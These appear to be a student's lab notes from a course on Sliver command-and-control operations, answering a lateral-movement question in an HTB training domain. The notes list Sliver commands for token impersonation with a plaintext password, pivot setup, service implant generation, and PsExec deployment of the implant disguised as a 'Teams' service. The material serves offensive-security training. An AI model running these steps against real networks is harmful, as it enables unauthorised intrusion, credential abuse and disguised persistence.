# [Lateral Movement](Intro%20to%20C2%20Operations%20with%20Sliver/Lateral%20Movement/Lateral%20Movement.md)
### What is the process integrity level of the spawned session through PsExec

```sh
make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

ls //srv01.child.htb.local/c$
```

![](Screenshot%202026-11-11%20at%2012.36.37.png)

```sh
pivots tcp --bind 172.16.1.11
```

![](Screenshot%202026-11-11%20at%2012.38.27.png)

```sh
generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

psexec --custom-exe /home/htb-ac-1951749/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
```

![](Screenshot%202026-11-11%20at%2012.42.39.png)

```sh
getprivs
```

![](Screenshot%202026-11-11%20at%2012.43.27.png)
